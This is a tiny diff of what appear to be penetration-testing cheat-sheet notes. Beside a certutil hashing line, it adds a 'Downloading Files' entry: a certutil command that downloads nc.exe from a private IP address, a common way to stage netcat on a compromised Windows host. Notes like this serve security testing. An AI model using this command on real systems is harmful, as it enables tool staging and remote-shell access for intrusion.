@@ -1,2 +1,6 @@
+#!/usr/bin/peno
+
 certutil -hashfile file sha256
 
+#Downloading Files
+certutil.exe -urlcache -f http://192.168.119.156/nc.exe nc.exe
